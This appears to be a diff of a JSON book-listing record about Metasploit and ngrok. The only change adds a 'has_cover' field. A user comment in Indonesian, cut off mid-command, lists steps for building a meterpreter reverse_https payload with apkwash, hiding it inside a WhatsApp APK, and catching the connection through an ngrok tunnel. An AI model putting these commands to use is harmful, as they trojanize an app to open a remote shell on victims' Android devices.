@@ -39,6 +39,7 @@
   ],
   "cover_url": "/cover_thumb/14124?v=1795448684",
   "cover_og_url": "/cover/14124/og?v=1795448684",
+  "has_cover": false,
   "url": "/book/msf-ngrok-onno-widodo-purbo/",
   "rating": null,
   "comment": "pak saya kan mau coba metasploit + ngrok, + apkwash pertama saya make ngrok $ngrok tcp 1337 keluar nya tcp://2.tcp.ngrok.io:11394 terus saya make apkwash apkwash -p android/meterpreter/reverse_https LHOST=2.tcp.ngrok.io LPORT=11394 -o LegitAndroidApp.apk -x whatsapp.apk terus saya buka msfconsole msfconsole use exploit/multi/handler set payload ndroid/meterpreter/reverse_https set lport 1337 set",
